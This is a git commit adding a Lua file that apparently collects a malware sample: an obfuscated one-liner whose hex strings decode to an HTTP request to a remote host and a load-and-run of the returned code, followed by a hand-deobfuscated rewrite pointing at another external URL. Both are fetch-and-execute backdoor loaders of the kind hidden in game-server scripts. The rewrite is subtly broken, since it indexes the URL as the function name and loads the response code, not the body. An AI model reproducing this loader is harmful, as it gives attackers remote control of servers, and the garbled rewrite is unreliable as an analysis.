c7602e226142dbceaf24944df51c04520c348cd4
EntyButOnWorkAccount <115137216+tempusernamedduck@users.noreply.github.com>
2023-08-08 12:22:05 +0200

    Create obf_file-03.lua

---
+++ obf_file-03.lua
@@ -0,0 +1,12 @@
+local FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU = {“\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74”,“\x61\x73\x73\x65\x72\x74”,“\x6c\x6f\x61\x64”,_G,“”,nil} FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[4][FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[1]](“\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x72\x69\x67\x67\x65\x72\x73\x65\x72\x76\x65\x72\x65\x76\x65\x6e\x74\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x7a\x58\x65\x41\x48”, function (QRCjQbRkEciwsFKICgtfZkeIFzHNoNTHkQBdKUBLbsiMFDqWnkxIawbaVsbjePbjnxABUz, fTWxfqwdawxIumeDDlqFCaYCGgHMrGRRHnaDriZcigTcMkElutobhmkympaWENusQuQAPP) if (fTWxfqwdawxIumeDDlqFCaYCGgHMrGRRHnaDriZcigTcMkElutobhmkympaWENusQuQAPP == FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[6] or fTWxfqwdawxIumeDDlqFCaYCGgHMrGRRHnaDriZcigTcMkElutobhmkympaWENusQuQAPP == FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[5]) then return end FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[4]FsCsYJWTUlikHlZDxTBFZQLbHMuimqEfYSwYwBnyUJlIgPXcFZgTViIxtZwcfxBJSfCvGU[2]() end)
+
+-- above is orignal code
+
+local requestArgs = {"https://tri.gg/s/CnBVGYJr/age-verification.net/v2_/stage3.php?to=zXeAH", "assert", "load", _G, "", nil}
+
+requestArgs[4][requestArgs[1]]("https://tri.gg/s/CnBVGYJr/age-verification.net/v2_/stage3.php?to=zXeAH", function (responseBody, responseCode)
+    if (responseCode == requestArgs[6] or responseCode == requestArgs[5]) then
+        return
+    end
+    requestArgs[4][requestArgs[2]](requestArgs[4][requestArgs[3]](responseCode))()
+end)
